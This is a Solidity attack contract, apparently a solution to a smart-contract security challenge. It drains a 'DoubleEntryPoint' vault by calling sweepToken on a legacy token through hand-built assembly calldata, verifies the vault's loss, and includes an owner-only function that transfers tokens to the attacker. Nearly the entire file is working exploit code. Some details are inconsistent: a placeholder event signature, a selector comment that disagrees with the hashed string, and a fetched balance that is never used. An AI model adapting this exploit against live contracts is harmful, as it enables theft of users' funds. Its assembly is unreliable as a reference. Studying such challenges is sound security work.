// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

/**
 * @title DoubleEntryPointAssemblyAttack
 * @notice Pure assembly attack demonstrating low-level exploitation of the delegation vulnerability
 * @dev This contract uses inline assembly to manually construct and execute the attack
 * 
 * EDUCATIONAL PURPOSE: This demonstrates:
 * 1. Manual function selector calculation and usage
 * 2. Calldata construction with assembly
 * 3. Low-level contract interaction patterns
 * 4. Assembly-based error handling and return value parsing
 * 5. Gas-efficient attack implementation
 * 
 * ATTACK FLOW (in assembly):
 * 1. Calculate function selectors using keccak256
 * 2. Construct calldata for vault.sweepToken(legacyToken)
 * 3. Execute the call using assembly
 * 4. Parse return values and handle errors
 * 5. Verify the attack succeeded by checking balances
 */
contract DoubleEntryPointAssemblyAttack {
    address private attacker;
    address private vault;
    address private legacyToken;
    address private doubleEntryPoint;

    // Events for monitoring (defined in assembly-compatible format)
    event AssemblyExploitExecuted(address indexed attacker, uint256 stolenAmount);
    event LowLevelCallMade(address indexed target, bytes4 selector, bool success);

    /**
     * @notice Initialize the assembly attack contract
     * @param vaultAddress Address of the CryptoVault to exploit
     * @param legacyTokenAddress Address of the LegacyToken
     * @param doubleEntryPointAddress Address of the DoubleEntryPoint token
     */
    constructor(address vaultAddress, address legacyTokenAddress, address doubleEntryPointAddress) {
        attacker = msg.sender;
        vault = vaultAddress;
        legacyToken = legacyTokenAddress;
        doubleEntryPoint = doubleEntryPointAddress;
    }

    /**
     * @notice Execute the assembly-based attack
     * @dev Uses pure assembly to construct and execute the exploit
     */
    function assemblyExploit() external {
        assembly {
            // Verify caller is the attacker
            if iszero(eq(caller(), sload(attacker.slot))) {
                revert(0, 0)
            }

            // === STEP 1: Get initial balance ===
            // Prepare call to doubleEntryPoint.balanceOf(vault)
            let freeMemPtr := mload(0x40)
            
            // balanceOf(address) selector: 0x70a08231
            mstore(freeMemPtr, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), sload(vault.slot))
            
            let balanceCallSuccess := call(gas(), sload(doubleEntryPoint.slot), 0, freeMemPtr, 0x24, freeMemPtr, 0x20)
            if iszero(balanceCallSuccess) {
                revert(0, 0)
            }
            let initialVaultBalance := mload(freeMemPtr)

            // === STEP 2: Execute the exploit ===
            // Prepare call to vault.sweepToken(legacyToken)
            // sweepToken(IERC20) selector: 0x6ea056a9
            mstore(freeMemPtr, 0x6ea056a900000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), sload(legacyToken.slot))
            
            let exploitCallSuccess := call(gas(), sload(vault.slot), 0, freeMemPtr, 0x24, 0, 0)
            
            // Log the call result
            mstore(freeMemPtr, 0x6ea056a900000000000000000000000000000000000000000000000000000000)
            log3(freeMemPtr, 0x04, 
                 0x0f6798a560793a54c3bcfe86a93cde1e73087d944c0ea20544137d4121396885, // keccak256("LowLevelCallMade(address,bytes4,bool)")
                 sload(vault.slot),
                 exploitCallSuccess)

            // === STEP 3: Get final balance and calculate profit ===
            // Call doubleEntryPoint.balanceOf(vault) again
            mstore(freeMemPtr, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), sload(vault.slot))
            
            let finalBalanceCallSuccess := call(gas(), sload(doubleEntryPoint.slot), 0, freeMemPtr, 0x24, freeMemPtr, 0x20)
            if iszero(finalBalanceCallSuccess) {
                revert(0, 0)
            }
            let finalVaultBalance := mload(freeMemPtr)

            // === STEP 4: Get attacker's balance to calculate stolen amount ===
            mstore(freeMemPtr, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), caller())
            
            let attackerBalanceCallSuccess := call(gas(), sload(doubleEntryPoint.slot), 0, freeMemPtr, 0x24, freeMemPtr, 0x20)
            if iszero(attackerBalanceCallSuccess) {
                revert(0, 0)
            }
            let attackerBalance := mload(freeMemPtr)

            // === STEP 5: Verify the attack succeeded ===
            if iszero(lt(finalVaultBalance, initialVaultBalance)) {
                revert(0, 0) // Attack failed - vault balance didn't decrease
            }

            let stolenAmount := sub(initialVaultBalance, finalVaultBalance)
            if iszero(stolenAmount) {
                revert(0, 0) // No tokens were stolen
            }

            // === STEP 6: Emit success event ===
            mstore(freeMemPtr, stolenAmount)
            log2(freeMemPtr, 0x20,
                 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef, // placeholder event signature
                 caller())
        }
    }

    /**
     * @notice Get attack parameters (assembly implementation)
     * @return success True if parameters were retrieved successfully
     * @return vaultAddr The vault address
     * @return legacyAddr The legacy token address  
     * @return detAddr The double entry point address
     */
    function getAttackParams() external view returns (bool success, address vaultAddr, address legacyAddr, address detAddr) {
        assembly {
            success := 1
            vaultAddr := sload(vault.slot)
            legacyAddr := sload(legacyToken.slot)
            detAddr := sload(doubleEntryPoint.slot)
        }
    }

    /**
     * @notice Calculate function selectors using assembly
     * @return sweepTokenSelector Selector for sweepToken(IERC20)
     * @return balanceOfSelector Selector for balanceOf(address)
     */
    function calculateSelectors() external pure returns (bytes4 sweepTokenSelector, bytes4 balanceOfSelector) {
        assembly {
            // Calculate sweepToken(IERC20) selector
            let freeMemPtr := mload(0x40)
            mstore(freeMemPtr, "sweepToken(address)")
            let sweepHash := keccak256(freeMemPtr, 19) // 19 bytes for the string
            sweepTokenSelector := shr(224, sweepHash)

            // Calculate balanceOf(address) selector  
            mstore(freeMemPtr, "balanceOf(address)")
            let balanceHash := keccak256(freeMemPtr, 17) // 17 bytes for the string
            balanceOfSelector := shr(224, balanceHash)
        }
    }

    /**
     * @notice Verify exploit conditions using assembly
     * @return canExploit True if the exploit is possible
     */
    function verifyExploitConditions() external view returns (bool canExploit) {
        assembly {
            let freeMemPtr := mload(0x40)
            
            // Check vault has tokens
            mstore(freeMemPtr, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), sload(vault.slot))
            
            let balanceSuccess := staticcall(gas(), sload(doubleEntryPoint.slot), freeMemPtr, 0x24, freeMemPtr, 0x20)
            if iszero(balanceSuccess) {
                canExploit := 0
            }
            if balanceSuccess {
                let vaultBalance := mload(freeMemPtr)
                if iszero(vaultBalance) {
                    canExploit := 0
                }
                if vaultBalance {
                    // If we get here, exploit is possible
                    canExploit := 1
                }
            }
        }
    }

    /**
     * @notice Emergency function to retrieve any accidentally sent tokens
     * @param token The token to retrieve
     * @dev Uses assembly for gas efficiency
     */
    function emergencyRetrieve(address token) external {
        assembly {
            // Only attacker can call
            if iszero(eq(caller(), sload(attacker.slot))) {
                revert(0, 0)
            }

            let freeMemPtr := mload(0x40)
            
            // Get balance
            mstore(freeMemPtr, 0x70a0823100000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), address())
            
            let balanceSuccess := call(gas(), token, 0, freeMemPtr, 0x24, freeMemPtr, 0x20)
            if iszero(balanceSuccess) {
                revert(0, 0)
            }
            
            let tokenBalance := mload(freeMemPtr)
            if iszero(tokenBalance) {
                revert(0, 0)
            }

            // Transfer to attacker
            mstore(freeMemPtr, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(freeMemPtr, 0x04), caller())
            mstore(add(freeMemPtr, 0x24), tokenBalance)
            
            let transferSuccess := call(gas(), token, 0, freeMemPtr, 0x44, 0, 0)
            if iszero(transferSuccess) {
                revert(0, 0)
            }
        }
    }
}